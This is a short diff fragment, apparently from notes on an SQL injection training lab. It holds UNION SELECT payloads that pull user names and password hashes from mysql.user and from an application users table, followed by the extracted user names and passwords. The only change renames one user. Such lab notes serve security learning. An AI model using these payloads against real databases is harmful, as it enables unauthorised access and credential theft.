@@ -39,7 +39,7 @@ UNION select 1,concat(user,0x3a,authentication_string),3,4,5,6,7,8 FROM mysql.us
 
 
 ' UNION SELECT username_vjfqaz, password_fcbidc FROM users_wjncox--
->>wiener
+>>bob
 >>zx7z65kw9f0bguzipipj
 >>administrator
 >>lzol7cqsdf6qcby6jeur
